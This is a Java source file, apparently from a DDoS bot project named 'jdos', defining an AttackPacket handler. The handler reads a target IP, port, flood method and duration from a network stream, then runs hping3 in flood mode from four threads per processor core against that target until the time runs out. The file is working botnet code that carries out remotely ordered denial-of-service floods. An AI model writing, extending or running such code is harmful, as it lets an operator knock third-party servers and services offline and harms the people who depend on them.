package com.jdos.packet.impl;

import java.io.DataInputStream;
import java.io.IOException;

import com.jdos.packet.Packet;

/**
 * The attack packet.
 * 
 * @author Desmond Jackson
 */
public class AttackPacket extends Packet {

	/**
	 * Creates the attack packet.
	 */
	public AttackPacket() {
		super(0);
	}

	@Override
	public void execute(DataInputStream din) throws IOException {
		String ip = din.readUTF();
		String port = din.readUTF();
		String method = din.readUTF();
		final int time = new Integer(din.readUTF()) * 1000;
		din.readInt(); // END of Packet
		final String[] command = new String[] {
				"hping3", ip, "-p", "" + port, "--" + method, "-d", "120", "-w", "64", "--flood",
		};
		int threads = Runtime.getRuntime().availableProcessors() * 4;
		for (int i = 0; i < threads; i++)
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						Process process = Runtime.getRuntime().exec(command);
						Thread.sleep(time);
						process.destroy();
						process.waitFor();
					} catch (IOException e) {
						e.printStackTrace();
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				
			}).start();
	}

}
